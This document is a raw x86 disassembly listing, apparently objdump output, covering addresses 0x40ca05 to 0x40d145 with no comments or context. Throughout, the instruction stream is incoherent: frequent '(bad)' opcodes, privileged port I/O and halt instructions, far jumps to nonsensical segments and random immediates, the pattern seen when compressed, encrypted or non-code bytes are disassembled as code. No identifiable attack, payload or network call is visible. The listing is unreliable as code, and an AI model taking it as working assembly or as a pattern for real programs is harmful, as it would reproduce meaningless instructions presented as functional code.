  40ca05:	rcl    DWORD PTR [esi-0x3f1e0d7b],1
  40ca0b:	jp     0x40ca38
  40ca0d:	sub    edi,ebp
  40ca0f:	(bad)  
  40ca10:	fld    QWORD PTR [esi+0x7487bc1]
  40ca16:	sbb    eax,0x9d0285dc
  40ca1b:	fwait
  40ca1c:	sbb    DWORD PTR [esi-0x389fcfb9],ebx
  40ca22:	lahf   
  40ca23:	ja     0x40c9fb
  40ca25:	xlat   BYTE PTR ds:[ebx]
  40ca26:	sub    DWORD PTR [esi+0x2e214615],ebp
  40ca2c:	fcomp  QWORD PTR [edx-0x506b81e7]
  40ca32:	sbb    dh,0x9f
  40ca35:	vmwrite ebx,ebp
  40ca38:	loopne 0x40c9e8
  40ca3a:	cs push cs
  40ca3c:	jle    0x40ca84
  40ca3e:	fdivr  st(4),st
  40ca40:	lock rcr DWORD PTR [ebp+0x9bb5151],1
  40ca47:	xchg   ecx,eax
  40ca48:	add    edi,DWORD PTR [edx+0x587d6c70]
  40ca4e:	pop    edx
  40ca4f:	std    
  40ca50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca51:	push   esp
  40ca52:	jnp    0x40cac0
  40ca54:	lods   eax,DWORD PTR ds:[esi]
  40ca55:	in     al,dx
  40ca56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca57:	push   edi
  40ca58:	cdq    
  40ca59:	bound  esp,QWORD PTR [edi+0x2]
  40ca5c:	cli    
  40ca5d:	xchg   esp,eax
  40ca5e:	mov    ecx,0xd15bf5fb
  40ca63:	xchg   ebx,eax
  40ca64:	pop    ecx
  40ca65:	mov    ch,0xb6
  40ca67:	adc    ecx,DWORD PTR [edx+0x74]
  40ca6a:	out    dx,eax
  40ca6b:	int    0x56
  40ca6d:	outs   dx,BYTE PTR ds:[esi]
  40ca6e:	nop
  40ca6f:	(bad)  
  40ca71:	or     BYTE PTR [edx+0x51718fec],bl
  40ca77:	dec    ecx
  40ca78:	mov    eax,ds:0xd331621f
  40ca7d:	xor    cl,dh
  40ca7f:	adc    esp,DWORD PTR [ecx-0x52f09bd6]
  40ca85:	sahf   
  40ca86:	fisubr DWORD PTR [edi]
  40ca88:	fadd   DWORD PTR [ebp+0x2927b3da]
  40ca8e:	cwde   
  40ca8f:	cwde   
  40ca90:	cmp    BYTE PTR [edi+edx*4],0xe9
  40ca94:	xor    DWORD PTR [eax],ecx
  40ca96:	(bad)  
  40ca98:	mov    dl,0x6a
  40ca9a:	pop    es
  40ca9b:	mov    al,ds:0x1d9ddedb
  40caa0:	xor    al,0xde
  40caa2:	lahf   
  40caa3:	lods   eax,DWORD PTR ds:[esi]
  40caa4:	loop   0x40ca59
  40caa6:	and    al,0xdd
  40caa8:	rcl    bh,0xfd
  40caab:	aas    
  40caac:	and    BYTE PTR [esi+0x15],dh
  40caaf:	repnz rcr BYTE PTR [ebp-0x5e6a078c],1
  40cab6:	cld    
  40cab7:	sub    DWORD PTR [eax+esi*1-0x20],edx
  40cabb:	mov    ds:0x7121cda0,eax
  40cac0:	dec    ecx
  40cac1:	adc    dl,bh
  40cac3:	(bad)  
  40cac4:	loop   0x40caac
  40cac6:	dec    eax
  40cac7:	sbb    ebx,0xfffffff0
  40caca:	pop    esi
  40cacb:	xchg   edi,eax
  40cacc:	cs xchg edi,eax
  40cace:	lea    ebx,[ebx+ebx*1]
  40cad1:	or     al,0x86
  40cad3:	fnstcw WORD PTR gs:[esi]
  40cad6:	sbb    BYTE PTR [edx+0x56],0x2
  40cada:	add    DWORD PTR [esi-0x7c2f5d63],esp
  40cae0:	dec    esp
  40cae1:	ja     0x40cabd
  40cae3:	ficomp WORD PTR [ecx+0x5]
  40cae6:	pop    ebx
  40cae7:	pop    edx
  40cae8:	mov    ds:0x16b8397a,al
  40caed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caee:	fist   WORD PTR ds:0xb3bd522a
  40caf4:	lock call FWORD PTR [esi]
  40caf7:	shl    BYTE PTR [edx+0x4821d845],1
  40cafd:	adc    edi,DWORD PTR [edi+0x3c]
  40cb00:	shl    BYTE PTR [eax+0x35],0xf9
  40cb04:	sub    cl,0x59
  40cb07:	scas   al,BYTE PTR es:[edi]
  40cb08:	test   BYTE PTR [edx+0x12e80c18],ah
  40cb0e:	lods   al,BYTE PTR ds:[esi]
  40cb0f:	popf   
  40cb10:	sbb    esp,ecx
  40cb12:	sub    DWORD PTR [eax-0x1b],eax
  40cb15:	dec    edi
  40cb16:	out    dx,eax
  40cb17:	mov    cl,0xa8
  40cb19:	dec    edx
  40cb1a:	gs cmp bl,dh
  40cb1d:	ins    BYTE PTR es:[edi],dx
  40cb1e:	and    ecx,DWORD PTR [edi+0x78]
  40cb21:	ins    DWORD PTR es:[edi],dx
  40cb22:	packuswb mm2,QWORD PTR [eax-0x286fab89]
  40cb29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb2a:	cwde   
  40cb2b:	popa   
  40cb2c:	repz xor eax,DWORD PTR [eax]
  40cb2f:	push   cs
  40cb30:	add    BYTE PTR [eax+0x2c98ae35],ch
  40cb36:	(bad)  
  40cb38:	stos   BYTE PTR es:[edi],al
  40cb39:	dec    edx
  40cb3a:	add    eax,0xbbb3caed
  40cb3f:	xlat   BYTE PTR ds:[ebx]
  40cb40:	push   eax
  40cb41:	jecxz  0x40cb63
  40cb43:	mov    esp,0x253b7986
  40cb48:	push   es
  40cb49:	(bad)  
  40cb4a:	ret    
  40cb4b:	inc    edi
  40cb4c:	mov    edx,0xa8e5a89d
  40cb52:	push   cs
  40cb53:	test   eax,0x2ea6122
  40cb58:	and    eax,ecx
  40cb5a:	fsin   
  40cb5c:	dec    esp
  40cb5d:	jb     0x40cbb0
  40cb5f:	rcr    ch,cl
  40cb61:	adc    eax,DWORD PTR [ebx+0x26671c8d]
  40cb67:	push   edx
  40cb68:	mov    edx,0xafc52a47
  40cb6d:	arpl   WORD PTR [ecx-0x63],bx
  40cb70:	mov    edi,0xf7c3304d
  40cb75:	push   cs
  40cb76:	ss adc eax,0x4fe15447
  40cb7c:	or     bl,dh
  40cb7e:	jns    0x40cb45
  40cb80:	cmc    
  40cb81:	xchg   ebp,eax
  40cb82:	xor    BYTE PTR [esi],0x53
  40cb85:	nop
  40cb86:	cmp    eax,0x505abd7b
  40cb8b:	fnstenv ds:0xb51fc012
  40cb91:	sbb    dh,dl
  40cb93:	or     ch,ah
  40cb95:	sbb    BYTE PTR [edi-0x7e],ch
  40cb98:	in     eax,dx
  40cb99:	out    dx,al
  40cb9a:	hlt    
  40cb9b:	adc    BYTE PTR [ebx+0x37],al
  40cb9e:	xchg   ebp,eax
  40cb9f:	dec    ebp
  40cba0:	inc    ebx
  40cba1:	js     0x40cc16
  40cba3:	lahf   
  40cba4:	fiadd  DWORD PTR [ebp+0x58]
  40cba7:	in     al,0x16
  40cba9:	in     eax,dx
  40cbaa:	and    ch,bl
  40cbac:	(bad)  
  40cbae:	ds das 
  40cbb0:	pop    edi
  40cbb1:	js     0x40cb5c
  40cbb3:	push   es
  40cbb4:	icebp  
  40cbb5:	hlt    
  40cbb6:	iret   
  40cbb7:	inc    edx
  40cbb8:	mov    eax,0x4d9a4a86
  40cbbd:	outs   dx,BYTE PTR ds:[esi]
  40cbbe:	ds dec edi
  40cbc0:	jo     0x40cc33
  40cbc2:	jbe    0x40cbf7
  40cbc4:	jecxz  0x40cbca
  40cbc6:	jmp    0x40cb97
  40cbc8:	pop    edi
  40cbc9:	jo     0x40cb86
  40cbcb:	test   BYTE PTR [si+0x7138],cl
  40cbd0:	dec    ebp
  40cbd1:	ss jle 0x40cbf2
  40cbd4:	cmp    al,0x4
  40cbd6:	and    edx,0x18
  40cbd9:	aam    0xba
  40cbdb:	outs   dx,BYTE PTR ds:[esi]
  40cbdc:	stos   DWORD PTR es:[edi],eax
  40cbdd:	add    BYTE PTR [ecx+0x7],al
  40cbe0:	pop    ecx
  40cbe1:	dec    esp
  40cbe2:	xor    dh,BYTE PTR [ecx]
  40cbe4:	add    al,0x25
  40cbe6:	inc    esp
  40cbe7:	retf   
  40cbe8:	cld    
  40cbe9:	pop    edx
  40cbea:	mov    ecx,0x51fad92e
  40cbef:	cmp    BYTE PTR [edx],dl
  40cbf1:	arpl   cx,sp
  40cbf3:	push   0xffffffcb
  40cbf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbf6:	pop    ecx
  40cbf7:	aas    
  40cbf8:	std    
  40cbf9:	ja     0x40cc58
  40cbfb:	cmp    dl,dh
  40cbfd:	std    
  40cbfe:	(bad)  
  40cbff:	in     al,0x39
  40cc01:	fistp  WORD PTR [esi-0x458cab92]
  40cc07:	sbb    eax,0xcfc24489
  40cc0c:	dec    esi
  40cc0d:	nop
  40cc0e:	sti    
  40cc0f:	xor    dl,BYTE PTR [ebx+eax*8]
  40cc12:	leave  
  40cc13:	(bad)  
  40cc14:	jmp    0x3945fa85
  40cc19:	hlt    
  40cc1a:	fisubr WORD PTR [edx]
  40cc1c:	fidivr DWORD PTR ds:0x49761aa4
  40cc22:	ins    BYTE PTR es:[edi],dx
  40cc23:	cmp    DWORD PTR [edi+0x7c73b557],edi
  40cc29:	aas    
  40cc2a:	dec    ebx
  40cc2b:	test   bh,dl
  40cc2d:	outs   dx,DWORD PTR ds:[esi]
  40cc2e:	sub    DWORD PTR [esi+0x2bbd3724],0xd
  40cc35:	dec    edx
  40cc36:	sbb    eax,0x2db147c
  40cc3b:	xchg   edi,eax
  40cc3c:	add    dl,dh
  40cc3e:	std    
  40cc3f:	imul   esp,DWORD PTR [ecx-0x2f864388],0x6a07f533
  40cc49:	(bad)  [ebp-0x34]
  40cc4c:	pusha  
  40cc4d:	in     eax,0x54
  40cc4f:	adc    eax,DWORD PTR [esi-0x5b]
  40cc52:	xor    eax,0xb06d0a7f
  40cc57:	test   eax,eax
  40cc59:	sbb    BYTE PTR [ebx],dl
  40cc5b:	add    BYTE PTR [ebx+0x4e9e7839],bh
  40cc61:	hlt    
  40cc62:	shl    DWORD PTR [edx+0xc5a8508],1
  40cc68:	fistp  DWORD PTR [ecx-0x24]
  40cc6b:	inc    edi
  40cc6c:	mov    esi,0xfbc70d9b
  40cc71:	and    eax,0x77a43816
  40cc76:	inc    edx
  40cc77:	sbb    al,0x9c
  40cc79:	(bad)  
  40cc7a:	out    0x5f,al
  40cc7c:	mov    ?,WORD PTR [edx+0x964e8c]
  40cc82:	ret    
  40cc83:	sub    al,0x60
  40cc85:	mov    DWORD PTR [edi],eax
  40cc87:	retf   
  40cc88:	push   esi
  40cc89:	cmp    eax,0xc2feed3a
  40cc8e:	jmp    0x40cc93
  40cc90:	xchg   ecx,eax
  40cc91:	popf   
  40cc92:	dec    ecx
  40cc93:	mov    bl,0x9f
  40cc95:	lods   al,BYTE PTR ds:[esi]
  40cc96:	xchg   edx,eax
  40cc97:	mov    ebx,0xf78ba1bb
  40cc9c:	(bad)  
  40cc9d:	out    dx,eax
  40cc9e:	push   ebp
  40cc9f:	fild   QWORD PTR [ecx+ebp*4-0x5e]
  40cca3:	add    DWORD PTR [ebx],edx
  40cca5:	push   esp
  40cca6:	jmp    0x4f87:0x543a95f9
  40ccad:	jne    0x40cc51
  40ccaf:	mov    ds:0x2694d715,al
  40ccb4:	mov    esp,0x19a2068
  40ccb9:	sbb    al,0x7e
  40ccbb:	sbb    eax,DWORD PTR [eiz*2-0x16878f3a]
  40ccc2:	retf   
  40ccc3:	mov    DWORD PTR [ebx-0x5b43608f],0x5d2dbd4a
  40cccd:	ja     0x40ccb8
  40cccf:	aad    0x1b
  40ccd1:	in     eax,dx
  40ccd2:	hlt    
  40ccd3:	in     al,dx
  40ccd4:	dec    ebx
  40ccd5:	sti    
  40ccd6:	dec    bl
  40ccd8:	scas   eax,DWORD PTR es:[edi]
  40ccd9:	fistp  DWORD PTR [ebx-0x5234a57b]
  40ccdf:	(bad)  
  40cce1:	mov    dl,0xe
  40cce3:	call   0xe48e:0x46749f4b
  40ccea:	or     eax,0xa5daac76
  40ccef:	aaa    
  40ccf0:	out    dx,al
  40ccf1:	popf   
  40ccf2:	hlt    
  40ccf3:	les    edi,FWORD PTR [edx]
  40ccf5:	dec    esi
  40ccf6:	add    eax,0xd7818878
  40ccfb:	(bad)  
  40ccfc:	(bad)
  40ccff:	jb     0x40cd01
  40cd01:	pop    ebx
  40cd02:	test   DWORD PTR [edi],eax
  40cd04:	in     eax,dx
  40cd05:	cld    
  40cd06:	cmp    ebp,ecx
  40cd08:	in     al,dx
  40cd09:	js     0x40ccb7
  40cd0b:	or     esp,DWORD PTR [ecx+ecx*1+0x4]
  40cd0f:	push   edx
  40cd10:	sub    cl,dl
  40cd12:	leave  
  40cd13:	sbb    edx,DWORD PTR [edi]
  40cd15:	add    ch,BYTE PTR [edx]
  40cd17:	mov    BYTE PTR [eax+0x2f7a313c],ch
  40cd1d:	dec    ebp
  40cd1e:	dec    esp
  40cd1f:	std    
  40cd20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd22:	(bad)  
  40cd23:	mov    esi,0xb8d1a054
  40cd28:	je     0x40cd83
  40cd2a:	or     al,0xf2
  40cd2c:	test   eax,0x82a5e609
  40cd31:	fcmovb st,st(0)
  40cd33:	push   eax
  40cd34:	jge    0x40cd6f
  40cd36:	sub    esp,esi
  40cd38:	sahf   
  40cd39:	ror    BYTE PTR [eax+ebp*8+0x6d],1
  40cd3d:	dec    ebp
  40cd3e:	mov    ecx,0xf63e0784
  40cd43:	hlt    
  40cd44:	rcr    esp,1
  40cd46:	pop    es
  40cd47:	push   DWORD PTR [eax+ebp*8]
  40cd4a:	call   0xef6a:0x4557a95e
  40cd51:	and    eax,0x393e8b7
  40cd56:	adc    ebp,DWORD PTR [edx+0xe0c8d79]
  40cd5c:	es leave 
  40cd5e:	cmp    al,0xfc
  40cd60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd61:	cs std 
  40cd63:	inc    ebx
  40cd64:	stos   BYTE PTR es:[edi],al
  40cd65:	lods   al,BYTE PTR ds:[esi]
  40cd66:	sti    
  40cd67:	mov    eax,0xe8223a80
  40cd6c:	inc    esp
  40cd6d:	ins    BYTE PTR es:[edi],dx
  40cd6e:	(bad)  
  40cd6f:	jmp    0x8517:0xdfe291a5
  40cd76:	jo     0x40cdd8
  40cd78:	fidiv  WORD PTR [edi-0x5f6e3d96]
  40cd7e:	aas    
  40cd7f:	js     0x40cd10
  40cd81:	adc    ah,BYTE PTR [ecx-0x73bd3c6a]
  40cd87:	(bad)  
  40cd88:	leave  
  40cd89:	mov    ebp,DWORD PTR [eax]
  40cd8b:	and    eax,0x7b7bb317
  40cd90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd91:	pushf  
  40cd92:	mov    bx,0x34a5
  40cd96:	xchg   ecx,eax
  40cd97:	add    eax,0xa4760b85
  40cd9c:	ins    BYTE PTR es:[edi],dx
  40cd9d:	bnd jl 0x9faaea01
  40cda4:	or     BYTE PTR [edx],bh
  40cda6:	pop    esi
  40cda7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cda8:	ja     0x40cd91
  40cdaa:	xor    al,0x99
  40cdac:	imul   edx,DWORD PTR [edi],0xe9e201ce
  40cdb2:	add    al,0xb1
  40cdb4:	iret   
  40cdb5:	scas   eax,DWORD PTR es:[edi]
  40cdb6:	enter  0xf7db,0xde
  40cdba:	sbb    al,0x72
  40cdbc:	(bad)
  40cdc1:	mov    dl,0xdd
  40cdc3:	and    al,0x6c
  40cdc5:	pop    ebp
  40cdc6:	daa    
  40cdc7:	cmp    al,0xd9
  40cdc9:	faddp  st(2),st
  40cdcb:	push   esi
  40cdcc:	scas   al,BYTE PTR es:[edi]
  40cdcd:	cli    
  40cdce:	inc    edi
  40cdcf:	addr16 (bad) 
  40cdd1:	aas    
  40cdd2:	mov    bh,0x93
  40cdd4:	mov    ch,0x38
  40cdd6:	aam    0xe8
  40cdd8:	cmp    al,0xf1
  40cdda:	xor    esi,esp
  40cddc:	jl     0x40cd77
  40cdde:	inc    esp
  40cddf:	cmp    al,0x49
  40cde1:	mul    ch
  40cde3:	out    0xf1,al
  40cde5:	ds inc esp
  40cde7:	lds    esp,FWORD PTR [eax-0x37c4e9ec]
  40cded:	adc    DWORD PTR [eax+0x2f],ecx
  40cdf0:	inc    esi
  40cdf1:	or     BYTE PTR [esi-0x66],dh
  40cdf4:	cdq    
  40cdf5:	loope  0x40cde5
  40cdf7:	js     0x40ce40
  40cdf9:	inc    ebp
  40cdfa:	xchg   ebp,eax
  40cdfb:	push   es
  40cdfc:	mov    eax,ds:0xffd040e6
  40ce01:	mov    eax,ds:0x6690feb6
  40ce06:	rcr    BYTE PTR [esp+ecx*4],cl
  40ce09:	cmp    BYTE PTR [esi],al
  40ce0b:	sub    DWORD PTR [ebp-0x16],0xf48fe882
  40ce12:	add    di,WORD PTR [edi]
  40ce15:	and    bh,BYTE PTR [edx]
  40ce17:	fisttp WORD PTR [esp+ecx*1]
  40ce1a:	call   0x40e7:0x517532fb
  40ce21:	out    0x17,al
  40ce23:	int    0x72
  40ce25:	adc    dl,BYTE PTR [esi]
  40ce27:	lods   al,BYTE PTR ds:[esi]
  40ce28:	mov    bl,0x78
  40ce2a:	stos   DWORD PTR es:[edi],eax
  40ce2b:	pusha  
  40ce2c:	xchg   edx,eax
  40ce2d:	addr16 jle 0x40ce0b
  40ce30:	sbb    eax,0x2849cb6d
  40ce35:	pop    esp
  40ce36:	dec    esi
  40ce37:	in     eax,0xd9
  40ce39:	or     edi,DWORD PTR [esi]
  40ce3b:	pop    ds
  40ce3c:	mov    ah,0x6b
  40ce3e:	cmp    eax,0x12716e1
  40ce43:	pop    edx
  40ce44:	fisttp QWORD PTR [edx+0x5d756051]
  40ce4a:	daa    
  40ce4b:	sub    eax,0xe988db79
  40ce50:	sub    ah,BYTE PTR [edx-0x7426f57d]
  40ce56:	xor    al,0x61
  40ce58:	in     al,0xdd
  40ce5a:	adc    DWORD PTR [ebx],esi
  40ce5c:	loopne 0x40ce5d
  40ce5e:	xchg   edx,eax
  40ce5f:	outs   dx,DWORD PTR ds:[esi]
  40ce60:	xor    eax,0xfbdac221
  40ce65:	mov    eax,0x1f954a91
  40ce6a:	int    0xc0
  40ce6c:	int    0x13
  40ce6e:	cdq    
  40ce6f:	enter  0x2337,0x56
  40ce73:	mov    bh,0x37
  40ce75:	loope  0x40ced3
  40ce77:	ret    0x33c9
  40ce7a:	in     al,dx
  40ce7b:	dec    ebp
  40ce7c:	xor    bl,BYTE PTR [edx]
  40ce7e:	sub    BYTE PTR [ebx+0x39],dh
  40ce81:	repnz out dx,al
  40ce83:	dec    esi
  40ce84:	dec    esi
  40ce85:	(bad)  
  40ce87:	loope  0x40ce1c
  40ce89:	sub    eax,0x1c48eada
  40ce8e:	and    al,0x2d
  40ce90:	xchg   esi,eax
  40ce91:	xor    al,0xcd
  40ce93:	jnp    0x40cef4
  40ce95:	push   esi
  40ce96:	clc    
  40ce97:	pop    esi
  40ce98:	xor    al,0x8
  40ce9a:	mov    esi,0xd743ee25
  40ce9f:	das    
  40cea0:	sbb    al,0xfa
  40cea2:	jae    0x40ced7
  40cea4:	rol    BYTE PTR [edi-0x1],1
  40cea7:	push   gs
  40cea9:	mov    ch,0x9e
  40ceab:	fcomi  st,st(1)
  40cead:	mov    ebp,0xdca92029
  40ceb2:	xchg   ecx,eax
  40ceb3:	cmp    eax,0xb769e308
  40ceb8:	leave  
  40ceb9:	push   0xffffff8e
  40cebb:	cs add al,0xb
  40cebe:	imul   esp,esi,0xffffff83
  40cec1:	test   dh,bl
  40cec3:	cdq    
  40cec4:	sbb    eax,0x9822403c
  40cec9:	mov    edx,0x526b8a81
  40cece:	imul   edi,DWORD PTR [ecx],0x54439d7b
  40ced4:	jle    0x40cebc
  40ced6:	or     al,BYTE PTR ds:0x204e526b
  40cedc:	cmp    eax,0xdb4c3b47
  40cee1:	ins    DWORD PTR es:[edi],dx
  40cee2:	es ins DWORD PTR es:[edi],dx
  40cee4:	lea    ebx,[edx+0x3d161487]
  40ceea:	ja     0x40cf4d
  40ceec:	jns    0x40ce86
  40ceee:	inc    edi
  40ceef:	and    DWORD PTR [esi+ebx*8+0x3a],esi
  40cef3:	loope  0x40ceca
  40cef5:	fmul   DWORD PTR [edi]
  40cef7:	iret   
  40cef8:	dec    edi
  40cef9:	and    al,0xf
  40cefb:	mov    al,ds:0xf5465a51
  40cf00:	mov    ds:0xa5184c34,eax
  40cf05:	clc    
  40cf06:	out    dx,al
  40cf07:	xchg   edi,eax
  40cf08:	adc    eax,0xf7c5575f
  40cf0d:	nop
  40cf0e:	jno    0x40cf41
  40cf10:	add    al,0xd2
  40cf12:	adc    BYTE PTR [ebx+0x7e8833d6],cl
  40cf18:	js     0x40ce9d
  40cf1a:	fisttp DWORD PTR [edx-0x60da4de0]
  40cf20:	test   eax,0x4efe3ed2
  40cf25:	push   ebx
  40cf26:	hlt    
  40cf27:	cmp    BYTE PTR [edi+0x76],0x13
  40cf2b:	je     0x40cebd
  40cf2d:	adc    al,0xff
  40cf2f:	cmp    DWORD PTR [eax],eax
  40cf31:	test   eax,0x2e32cdde
  40cf36:	sub    cl,BYTE PTR [edi]
  40cf38:	pop    es
  40cf39:	inc    esp
  40cf3a:	jle    0x40cf07
  40cf3c:	bound  esp,QWORD PTR [ecx+0x5846556]
  40cf42:	adc    ebp,DWORD PTR es:[esi]
  40cf45:	rcr    esi,0x9a
  40cf48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf49:	mov    dh,0x27
  40cf4b:	das    
  40cf4c:	sub    eax,DWORD PTR ds:0xea7ffd7a
  40cf52:	(bad)  
  40cf54:	mov    eax,ds:0x6afeda8c
  40cf59:	dec    ebx
  40cf5a:	outs   dx,DWORD PTR gs:[esi]
  40cf5c:	sbb    al,0x4a
  40cf5e:	gs mov bh,0x6a
  40cf61:	jae    0x40cfb5
  40cf63:	push   cs
  40cf64:	bound  edi,QWORD PTR [ebx+0x6c]
  40cf67:	push   edx
  40cf68:	jecxz  0x40cf36
  40cf6a:	pop    es
  40cf6b:	fs jne 0x40cf5c
  40cf6e:	les    ebp,FWORD PTR [ebx-0x2e]
  40cf71:	pop    edi
  40cf72:	push   ss
  40cf73:	adc    al,0x28
  40cf75:	outs   dx,DWORD PTR ds:[esi]
  40cf76:	sub    eax,0xf685f580
  40cf7b:	cmp    ah,bh
  40cf7d:	jae    0x40cf18
  40cf7f:	add    edx,ebp
  40cf81:	imul   eax,DWORD PTR [ebp-0x1fda7099],0xcbfd4516
  40cf8b:	test   eax,0xf86e0919
  40cf90:	pusha  
  40cf91:	mov    cs,WORD PTR [eax-0x6df0232b]
  40cf97:	xchg   edx,eax
  40cf98:	cwde   
  40cf99:	pop    ebp
  40cf9a:	dec    BYTE PTR [ebp+0x395e8a01]
  40cfa0:	mov    eax,0xaaa81001
  40cfa5:	pop    esp
  40cfa6:	nop
  40cfa7:	cmp    DWORD PTR [edx+0x5],edi
  40cfaa:	adc    eax,0x7791a878
  40cfaf:	or     eax,0x9892004f
  40cfb4:	jne    0x40d010
  40cfb6:	xchg   ebx,eax
  40cfb7:	pop    ebx
  40cfb8:	icebp  
  40cfb9:	and    ch,BYTE PTR [ebx]
  40cfbb:	int    0xe9
  40cfbd:	mov    ch,0xe7
  40cfbf:	pushf  
  40cfc0:	pop    ss
  40cfc1:	dec    eax
  40cfc2:	push   ecx
  40cfc3:	stc    
  40cfc4:	hlt    
  40cfc5:	and    eax,0x9c3eace6
  40cfca:	test   eax,0xf249a5c1
  40cfcf:	adc    DWORD PTR [esi-0x9015ed5],ecx
  40cfd5:	mov    cl,0x13
  40cfd7:	push   ss
  40cfd8:	mov    esp,0xc8cf7518
  40cfdd:	mov    al,BYTE PTR [esi+esi*8]
  40cfe0:	push   0x9f81790b
  40cfe5:	gs rol DWORD PTR cs:[ebx],1
  40cfe9:	bound  ecx,QWORD PTR ds:[ecx]
  40cfec:	out    0x1a,al
  40cfee:	sahf   
  40cfef:	mov    ch,0xff
  40cff1:	push   ebp
  40cff2:	lods   eax,DWORD PTR ds:[esi]
  40cff3:	push   eax
  40cff4:	xchg   DWORD PTR [ebp+0xa],eax
  40cff7:	add    eax,0xd0336098
  40cffc:	sbb    DWORD PTR [ebp-0x7d],ebx
  40cfff:	mov    al,0xc2
  40d001:	fsub   QWORD PTR [ebp+0x7c]
  40d004:	in     al,0x35
  40d006:	jns    0x40cfb7
  40d008:	loop   0x40cfd4
  40d00a:	cld    
  40d00b:	pop    esi
  40d00c:	sbb    BYTE PTR [ebp-0x37ab5e98],ch
  40d012:	in     eax,0x23
  40d014:	std    
  40d015:	cli    
  40d016:	sub    edi,DWORD PTR [esp+eax*4+0x3]
  40d01a:	jecxz  0x40d019
  40d01c:	inc    ebp
  40d01d:	xor    BYTE PTR [ebx],0x64
  40d020:	cli    
  40d021:	mov    edx,DWORD PTR [edx]
  40d023:	cs xchg esi,eax
  40d025:	(bad)  
  40d026:	fbstp  TBYTE PTR [ebx+0x17930d8e]
  40d02c:	sbb    DWORD PTR [ecx],ecx
  40d02e:	push   ebp
  40d02f:	pop    es
  40d030:	pop    ebp
  40d031:	jo     0x40cfb9
  40d033:	sahf   
  40d034:	cmp    DWORD PTR [edx-0x62],ebx
  40d037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d038:	jb     0x40d08f
  40d03a:	sti    
  40d03b:	(bad)  
  40d03c:	ja     0x40cfd5
  40d03e:	mov    ch,0xbd
  40d041:	outs   dx,BYTE PTR ds:[esi]
  40d042:	ins    BYTE PTR es:[edi],dx
  40d043:	add    ah,ah
  40d045:	test   bl,cl
  40d047:	jmp    0xa8bd28a
  40d04c:	jne    0x40d036
  40d04e:	adc    eax,DWORD PTR [edi]
  40d050:	cmp    BYTE PTR [edi-0x45],cl
  40d053:	loop   0x40d080
  40d055:	shl    DWORD PTR [ebx+0x2ca04228],1
  40d05b:	jb     0x40d0a7
  40d05d:	jl     0x40d0b8
  40d05f:	dec    edx
  40d060:	add    edi,DWORD PTR [ebx]
  40d062:	inc    esp
  40d063:	call   0x57b81e8e
  40d068:	shl    ecx,0x93
  40d06b:	nop
  40d06c:	push   eax
  40d06d:	aas    
  40d06e:	neg    DWORD PTR [ecx]
  40d070:	pop    ss
  40d071:	add    eax,0xb13150e5
  40d076:	test   DWORD PTR [edi-0x2d52cbc6],edx
  40d07c:	aaa    
  40d07d:	lahf   
  40d07e:	pop    edi
  40d07f:	(bad)  
  40d080:	les    esp,FWORD PTR [ebx+0x33]
  40d083:	xchg   ebp,eax
  40d084:	or     BYTE PTR [ebx+0x74ccf1e7],bl
  40d08a:	ins    DWORD PTR es:[edi],dx
  40d08b:	mov    eax,ss:0x2b70aa8d
  40d091:	xchg   ebp,eax
  40d092:	adc    al,0xc0
  40d094:	js     0x40d06c
  40d096:	mov    ebp,0xf8b460a
  40d09b:	push   0x57
  40d09d:	ins    BYTE PTR es:[edi],dx
  40d09e:	add    eax,0xe26d279f
  40d0a3:	xchg   ebx,eax
  40d0a4:	imul   ebx,edx,0x4bcdb576
  40d0aa:	mov    cl,0xe1
  40d0ac:	ins    BYTE PTR es:[edi],dx
  40d0ad:	jge    0x40d0f5
  40d0af:	or     esi,DWORD PTR [eax+0x1192e591]
  40d0b5:	xchg   ebx,eax
  40d0b6:	mov    ecx,0x2ce4cd0b
  40d0bb:	mov    ch,0xd2
  40d0bd:	mov    ebx,0xe187b451
  40d0c2:	out    dx,eax
  40d0c3:	push   eax
  40d0c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0c5:	shl    BYTE PTR [edi],cl
  40d0c7:	sub    al,0xae
  40d0c9:	and    bh,BYTE PTR [ecx+0x74]
  40d0cc:	inc    ebx
  40d0cd:	mov    dh,0x41
  40d0cf:	jg     0x40d0b2
  40d0d1:	loopne 0x40d092
  40d0d3:	outs   dx,DWORD PTR ds:[esi]
  40d0d4:	repz das 
  40d0d6:	popf   
  40d0d7:	mov    edi,0x529b09d8
  40d0dc:	in     eax,0xfb
  40d0de:	mov    eax,ds:0x7cd02494
  40d0e3:	push   eax
  40d0e4:	test   eax,0x78046db7
  40d0e9:	xlat   BYTE PTR ds:[ebx]
  40d0ea:	adc    cl,BYTE PTR [edi]
  40d0ec:	inc    ebx
  40d0ed:	shl    BYTE PTR [esp+ebx*4],0xa5
  40d0f1:	xchg   edx,eax
  40d0f2:	mov    ecx,0x9eebf6e
  40d0f7:	cwde   
  40d0f8:	aad    0xf
  40d0fa:	das    
  40d0fb:	push   0xfffffff3
  40d0fd:	dec    ecx
  40d0fe:	mov    DWORD PTR [ecx+0x42131bbf],edx
  40d104:	test   eax,0x7189c4e7
  40d109:	mov    ecx,0xb7c02084
  40d10e:	xchg   BYTE PTR ds:0xc873910,ah
  40d114:	xchg   ebx,eax
  40d115:	(bad)  
  40d116:	clc    
  40d117:	mov    ecx,0x64f04505
  40d11c:	adc    BYTE PTR [edi+edx*1-0xb64814d],bh
  40d123:	and    BYTE PTR [eax-0x65],cl
  40d126:	push   ss
  40d127:	adc    DWORD PTR [ebx-0x2c77fcf4],ecx
  40d12d:	cmc    
  40d12e:	pop    ebp
  40d12f:	xor    BYTE PTR [ebx],bl
  40d131:	addr16 jae 0x40d187
  40d134:	sub    eax,0x57f0a316
  40d139:	push   edi
  40d13a:	jns    0x40d0bd
  40d13c:	push   esi
  40d13d:	xchg   esp,eax
  40d13e:	push   0xd7f7745
  40d143:	jno    0x40d0e1
  40d145:	pusha  
